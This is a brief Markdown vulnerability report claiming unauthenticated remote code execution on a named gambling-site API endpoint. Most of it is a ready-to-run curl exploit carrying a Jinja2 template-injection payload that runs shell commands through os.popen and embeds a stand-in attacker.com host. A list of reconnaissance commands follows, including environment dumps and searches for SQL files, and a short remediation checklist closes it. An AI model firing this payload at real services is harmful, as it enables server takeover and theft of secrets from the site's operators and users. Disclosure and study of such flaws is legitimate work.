# ðŸš¨ CRITICAL VULNERABILITY GUIDE - RCE with Invalid Tokens

## **Vulnerability Summary**

**Endpoint:** 
**Method:** POST
**Authentication:** Bypassed (works with invalid/expired tokens)
**Payload:** SSTI in returnUrl parameter

## **Exploitation Method**

```bash
curl -X POST 'https://api.usun.cash/api/game/usun/launch' \
-H "Authorization: Bearer ANY_INVALID_TOKEN" \
-H 'Content-Type: application/json' \
-d '{
  "gameName": "exploit",
  "isMobile": true,
  "returnUrl": "https://attacker.com?data={{ self._TemplateReference__context.joiner.init.globals.os.popen(\"COMMAND\").read() }}"
}'
```

## **Critical Commands Executed**

- System Information: `whoami`, `id`, `uname -a`
- File System: `ls -la /`, `pwd`
- Environment: `env`
- Network: `netstat -tuln`
- Processes: `ps aux`
- File Search: `find / -name '*.sql'`

## **Security Impact**

1. **Complete Authentication Bypass**
2. **Full Remote Code Execution**
3. **System Information Disclosure**
4. **Potential Data Exfiltration**
5. **Backdoor Establishment Capability**

## **Immediate Remediation Required**

1. **Implement proper token validation**
2. **Add input sanitization**
3. **Audit all endpoints**
4. **Implement WAF rules**

